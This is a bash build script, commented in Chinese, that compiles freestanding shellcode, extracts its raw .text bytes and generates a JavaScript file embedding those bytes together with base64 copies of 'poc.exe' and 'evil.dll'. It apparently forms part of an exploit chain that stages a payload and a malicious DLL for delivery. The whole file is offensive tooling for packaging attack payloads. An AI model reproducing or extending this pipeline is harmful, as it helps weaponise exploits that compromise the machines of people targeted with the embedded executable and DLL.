#!/bin/bash
# build_w3.sh — v3 构建：编译 payload → 抽取干净 .text → 生成 payload_embed_w3.js
# 产物偏移由 llvm-nm 读取，直接写入 embed 常量（无需手抄）。
set -e
PKG="$(cd "$(dirname "$0")" && pwd)"; cd "$PKG"

FLAGS="-Oz -ffreestanding -fno-stack-protector -fno-asynchronous-unwind-tables"
clang $FLAGS -c payload_src_w3.c -o payload_w3.o

# 关键校验：不得存在未重定位的占位 call（e8 00 00 00 00 = 跨函数调用裸抽后掉进垃圾）
NCALL=$(llvm-objdump -d payload_w3.o | grep -c "e8 00 00 00 00" || true)
[ "$NCALL" = "0" ] || { echo "FATAL: $NCALL unresolved rel32 calls — add always_inline"; exit 1; }

RAW=$(llvm-readobj --sections payload_w3.o | sed -n '/Name: \.text/,/Reloc/p' | grep PointerToRawData | grep -oE '0x[0-9a-f]+|[0-9]+' | head -1)
SZ=$(llvm-readobj --sections payload_w3.o | sed -n '/Name: \.text/,/Reloc/p' | grep RawDataSize | grep -oE '0x[0-9a-f]+|[0-9]+' | head -1)
dd if=payload_w3.o of=payload_w3.bin bs=1 skip=$((RAW)) count=$((SZ)) 2>/dev/null

ENTRY=$(llvm-nm payload_w3.o | awk '$3=="payload_main"{print $1}')
META=$(llvm-nm payload_w3.o | awk '$3=="g_meta"{print $1}')
POC_LEN=$(wc -c < poc.exe); EV_LEN=$(wc -c < evil.dll)
echo "ENTRY=0x$ENTRY META=0x$META bin=$(wc -c < payload_w3.bin) poc=$POC_LEN ev=$EV_LEN"

BYTES=$(od -An -v -tu1 payload_w3.bin | tr -s ' \n' ' ' | sed 's/^ *//; s/ *$//; s/ /,/g')
{
  echo "/* 自动生成 by build_w3.sh — 勿手改 */"
  echo "const ENTRY=0x$ENTRY, META_OFF=0x$META, POC_LEN=$POC_LEN, EV_LEN=$EV_LEN;"
  echo "const PAYLOAD=new Uint8Array([$BYTES]);"
  echo "const POC_B64=\"$(base64 -w0 poc.exe)\";"
  echo "const EV_B64=\"$(base64 -w0 evil.dll)\";"
  echo "function b64bytes(s){const b=atob(s),a=new Uint8Array(b.length);for(let i=0;i<b.length;i++)a[i]=b.charCodeAt(i);return a}"
} > payload_embed_w3.js
echo "payload_embed_w3.js: $(wc -c < payload_embed_w3.js) bytes"
